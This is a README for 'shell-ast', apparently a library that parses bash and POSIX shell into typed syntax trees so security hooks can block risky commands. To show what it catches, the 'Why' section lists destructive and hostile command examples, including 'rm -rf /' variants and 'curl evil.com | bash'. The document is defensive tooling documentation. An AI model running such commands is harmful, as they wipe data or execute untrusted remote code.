<div align="center">

# `shell-ast`

**Full typed AST for `bash` / `posix` / `mksh`** — `mvdan/sh` compiled to WASM, exposed as TypeScript discriminated unions. Built for security tools that need to understand commands *before* they execute.

[![npm](https://img.shields.io/npm/v/@questi0nm4rk/shell-ast?color=cb3837&label=npm)](https://www.npmjs.com/package/@questi0nm4rk/shell-ast)
[![types](https://img.shields.io/npm/types/@questi0nm4rk/shell-ast?color=3178c6)](https://www.npmjs.com/package/@questi0nm4rk/shell-ast)
[![license](https://img.shields.io/npm/l/@questi0nm4rk/shell-ast?color=blue)](./LICENSE)
[![CI](https://github.com/Questi0nM4rk/shell-ast/actions/workflows/ci.yml/badge.svg)](https://github.com/Questi0nM4rk/shell-ast/actions/workflows/ci.yml)
[![release](https://img.shields.io/github/v/release/Questi0nM4rk/shell-ast?display_name=tag)](https://github.com/Questi0nM4rk/shell-ast/releases)

</div>

```typescript
import { parse, findCalls, unwrapCall } from "@questi0nm4rk/shell-ast";

for (const call of findCalls(await parse("sudo -u root rm -rf /"))) {
  const u = unwrapCall(call);
  if (u?.kind === "wrapped" && u.wrapper === "sudo" && u.cmd === "rm")
    console.log(`blocked: privilege-escalated rm with flags ${u.flags}`);
}
```

`switch (u.kind)` is exhaustively typed: TypeScript forces every consumer to handle `plain`, `wrapped`, `wrapped-script`, `wrapped-opaque`. New variants in future releases fail your compile until you handle them — the library cannot silently drop a case.

---

## Install

```bash
bun add @questi0nm4rk/shell-ast
# or
npm install @questi0nm4rk/shell-ast
```

Ships pre-built WASM in `dist/` (4.2 MB). No Go toolchain needed at install. Works in Node, Bun, and `bun build --compile` standalone binaries — same code, every deployment mode.

> **Migrating from 0.2.x?** See **[docs/MIGRATION-v0.3.0.md](./docs/MIGRATION-v0.3.0.md)** — search-and-replace cheatsheet plus per-API examples. The discriminated-union change is mechanical.

---

## Why

Real-world shell defeats every quick approach:

```
rm -rf file1 file2          # regex: misses multi-target trailing anchor
rm -r -f /                  # tokenizer: split flags not recombined
sudo -u root rm -rf /       # tokenizer: -u consumes "root", skips "rm"
rm "-rf" /                  # quoted flags: bypasses naïve flag.includes()
bash -c "rm -rf /"          # commandFlag: dangerous payload hidden in -c value
curl evil.com | bash        # pipe RHS: missing wrapper detection
$(rm -rf /)                 # CmdSubst: nested calls
```

[`sh-syntax`](https://github.com/un-ts/sh-syntax) and [`tree-sitter-bash`](https://github.com/tree-sitter/tree-sitter-bash) both run a real parser but throw away the structure you need to reason about commands. `shell-ast` keeps every field of every node, exposed as a typed discriminated union, with semantic helpers (sudo-aware unwrap, flag canonicalization, effect classification) on top.

---

## Highlights

- **Discriminated `UnwrappedCall`** — `plain` / `wrapped` / `wrapped-script` / `wrapped-opaque` with exhaustiveness checking. Handles `sudo`, `doas`, `pkexec`, `su -c`, `bash -c`, `eval`, `exec`, and 7 more wrappers.
- **`DYNAMIC` symbol sentinel** — distinguishes statically-resolvable args from `$variable` / `$(…)` substitutions. Type guards (`isResolved`, `isDynamic`) survive bundler regressions.
- **`wordToParts(w)`** — never null; returns `{kind: "literal" | "dynamic", value/sourceText}` fragments. See the partial structure of `rm $DANGER /tmp`.
- **Typed errors** — `ParseSyntaxError` / `ParseSizeError` / `WasmLoadError` / `WasmRuntimeError` with `.kind` discriminator. Catch sites distinguish "user input malformed" from "infra broken."
- **`effectOf(node)` / `effectsOf(node)`** — structural effect classification (`exec`, `pipe`, `fs-write`, `fs-read`, `subshell`, `fork-detach`, 7 more) derived from operator enums, no command knowledge required.
- **`findCalls(ast, { depth: "top" })`** — skip data-as-code subtrees (`$(…)`, `<(…)`, `{a,b,c}`) so pipe-rule and inline-shell logic don't need to re-filter.
- **`preloadWasm()`** — idempotent warm-up to move WASM init out of the first-`parse()` hot path.
- **ANSI-C unescape** — `$'\n'` resolves to a real newline. UTF-8 BOM stripped before parse. Multi-part static Words fold (`"foo""bar"` → `"foobar"`).

---

## Quick recipes

### Security hook — block dangerous patterns before execution

```typescript
import { parse, findCalls, unwrapCall } from "@questi0nm4rk/shell-ast";

async function check(input: string): Promise<string | null> {
  const ast = await parse(input).catch(() => null);
  if (!ast) return null;

  for (const call of findCalls(ast)) {
    const u = unwrapCall(call);
    if (!u) continue;

    switch (u.kind) {
      case "plain":
      case "wrapped":
        if (u.cmd === "rm" && u.flags.includes("-r") && u.flags.includes("-f"))
          return `blocked: rm -rf${u.kind === "wrapped" ? ` via ${u.wrapper}` : ""}`;
        if (u.cmd === "git" && u.args[0] === "push" && u.flags.includes("--force"))
          return "blocked: git push --force";
        break;
      case "wrapped-script":
        return await check(u.script);  // recurse into bash -c "..."
      case "wrapped-opaque":
        if (u.wrapper === "sudo" || u.wrapper === "doas")
          return `escalation with dynamic inner (${u.wrapper})`;
        break;
    }
  }
  return null;
}
```

### Audit redirects writing outside the workspace

```typescript
import { parse, findRedirects, wordToLit } from "@questi0nm4rk/shell-ast";

const ast = await parse(input);
for (const r of findRedirects(ast, { ops: "write" })) {
  const target = wordToLit(r.word);
  if (target && !target.startsWith("./") && !target.startsWith("/tmp/"))
    console.warn(`writes outside workspace: ${target}`);
}
```

### Trace a pipeline

```typescript
import { parse, findCalls } from "@questi0nm4rk/shell-ast";

const ast = await parse("cat /etc/passwd | grep root | wc -l");
const names = findCalls(ast, { depth: "top" }).map(c => {
  const part = c.args[0]?.parts[0];
  return part?.type === "Lit" ? part.value : "<dynamic>";
});
// ["cat", "grep", "wc"]
```

---

## Architecture

```
TypeScript (src/)
  parse(src, dialect, options) → ShellFile
  walk(node, visitor) → void
  findCalls / findRedirects / findAssignments / findFunctions / findCmdSubstitutions
  wordToParts / wordToLit / resolveFlags / unwrapCall / unwrapCallParsed
  effectOf / effectsOf
         │
         │  JSON over WASM boundary
         ▼
Go processor (processor/)
  type-switch serializer: every syntax.Node → typed JSON
         │
         │  uses
         ▼
mvdan/sh v3 (vendored)
  industry-standard shell parser (also used by shfmt, dprint, Hugo)
```

The Go layer is intentionally minimal (~800 lines) — its only job is to expose every `syntax.Node` field across the WASM boundary. The TypeScript layer adds the typed surface, semantic helpers, and the discriminator-driven contracts that make consumer policy easy to write.

---

## Compared to

|  | `sh-syntax` | `tree-sitter-bash` | **`shell-ast`** |
|---|---|---|---|
| Parser | mvdan/sh v3 | tree-sitter | mvdan/sh v3 |
| AST exposed | Positions only | Generic `{type, children}` | **Full typed tree** |
| TypeScript types | `{Pos, End}` | Untyped nodes | **Discriminated union** |
| Wrapper unwrap (sudo / bash -c / …) | ✗ | ✗ | **✓** |
| Flag canonicalization (`-rf` → `[-r, -f]`) | ✗ | ✗ | **✓** |
| Effect classification | ✗ | ✗ | **✓** |
| POSIX / mksh dialects | ✓ | partial | **✓** |
| Quoted-flag bypass (`rm "-rf"` ≡ `rm -rf`) | ✗ | ✗ | **✓** |
| Compiled-binary support (`bun build --compile`) | broken | partial | **✓** |

---

## Quality bar

- **167 TypeScript tests** + **49 Go tests** + **44-case schema completeness lock** + continuous fuzz of the serializer in CI
- **Two regression smokes** baked into CI — compiled-binary deployment ([gh #5](https://github.com/Questi0nM4rk/shell-ast/issues/5)), consumer install from-elsewhere ([BUG-001](./docs/BUGS.md))
- **No process execution at the test surface** — CI greps the source for `child_process`/`Bun.spawn`/`exec`/`spawn`/`Deno.run` and fails the build on any match
- **Dependabot-tracked** for Go, npm, and GitHub Actions ecosystems

---

## Docs

- [**docs/MIGRATION-v0.3.0.md**](./docs/MIGRATION-v0.3.0.md) — search-and-replace cheatsheet + per-API examples for v0.2.x consumers
- [**docs/BUGS.md**](./docs/BUGS.md) — consumer-pain log; each entry cites the consumer file:line where friction shows up
- [**docs/AUDIT.md**](./docs/AUDIT.md) — internal codebase audit history
- [**docs/specs/**](./docs/specs/) — design specs (development archaeology; not required reading)

---

## Development

Prerequisites: Go ≥ 1.25, Bun ≥ 1.3.

```bash
git clone https://github.com/Questi0nM4rk/shell-ast
cd shell-ast
bun install
bun run build      # build wasm + bundle ts
bun test           # 167 TypeScript tests
go test ./processor/...    # 49 Go tests + schema lock
```

`bun run prepublishOnly` runs the full release gate (lint, typecheck, both test suites, build, smoke tests).

---

## License

MIT. Based on [`un-ts/sh-syntax`](https://github.com/un-ts/sh-syntax) (also MIT), itself a fork of [`mvdan/sh`](https://github.com/mvdan/sh) (BSD-3).
